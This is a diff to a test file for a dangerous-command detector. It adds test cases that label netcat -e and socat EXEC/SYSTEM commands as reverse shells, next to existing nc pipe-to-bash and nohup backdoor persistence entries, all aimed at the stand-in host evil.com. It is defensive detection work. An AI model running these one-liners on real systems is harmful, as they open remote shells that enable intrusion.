@@ -1017,6 +1017,11 @@ describe("isDangerousCommand", () => {
     // nc/ncat pipe-to-shell — flag-free reverse shell variant (no -e required)
     ["nc pipe to bash reverse shell", "nc evil.com 4444 | bash | nc evil.com 4445", "reverse-shell"],
     ["ncat pipe to sh reverse shell", "ncat evil.com 4444 | sh", "reverse-shell"],
+    // nc -e shell spawn — netcat exec flag directly spawning a shell
+    ["nc -e /bin/bash reverse shell", "nc -e /bin/bash evil.com 4444", "reverse-shell"],
+    // socat EXEC: and SYSTEM: reverse shell modes
+    ["socat EXEC:bash reverse shell", "socat EXEC:bash tcp:evil.com:4444", "reverse-shell"],
+    ["socat SYSTEM:bash reverse shell", "socat TCP:evil.com:4444 SYSTEM:bash", "reverse-shell"],
     // persistence (nohup/disown/screen/tmux)
     ["nohup background process", "nohup ./backdoor.sh &", "persistence"],
     ["disown bare", "disown", "persistence"],
